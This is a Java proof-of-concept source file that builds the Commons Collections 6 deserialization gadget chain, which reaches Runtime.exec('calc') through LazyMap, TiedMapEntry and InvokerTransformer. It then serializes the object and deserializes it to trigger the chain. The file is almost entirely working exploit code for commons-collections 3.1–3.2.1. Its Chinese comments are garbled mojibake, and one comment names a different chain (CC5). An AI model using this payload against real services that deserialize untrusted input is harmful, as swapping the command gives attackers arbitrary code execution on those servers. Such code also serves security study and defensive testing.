package CC;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * ���Ի�����3.1-3.2.1��jdk1.7,1.8
 *
 * CC5 ���� BadAttributeValueExpException �����л�ȥ���� LazyMap.get()��
 * ���� BadAttributeValueExpException ��AnnotationInvocationHandler �������������� HashMap!
 *
 * ������ jdk 1.7 �ģ���ͬ�汾 HashMap readObject �������в�ͬ
 *   ->HashMap.readObject()
 *       ->HashMap.putForCreate()
 *           ->HashMap.hash()
 *             ->TiedMapEntry.hashCode()
 *                     ->TiedMapEntry.getValue()
 *                     ->LazyMap.get()
 *                       ->ChainedTransformer.transform()
 *                           ->ConstantTransformer.transform()
 *                               ->InvokerTransformer.transform()
 *                                   ->��������
 */
public class CommonsCollections6 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {

        Transformer[] fakeTransformer = new Transformer[]{};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformerʵ��
        //�����üٵ� Transformer ���飬��ֹ����ʱִ������
        Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);

        //LazyMapʵ��
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);

        //TiedMapEntry ʵ��
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "test");


        //ͨ������������� ransformer ����
        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);
        //������� hashMap.put �� LazyMap ��ɵ�Ӱ��
        lazyMap.clear();

        //���л�
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashMap);
        oos.flush();
        oos.close();

        //���Է����л�
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
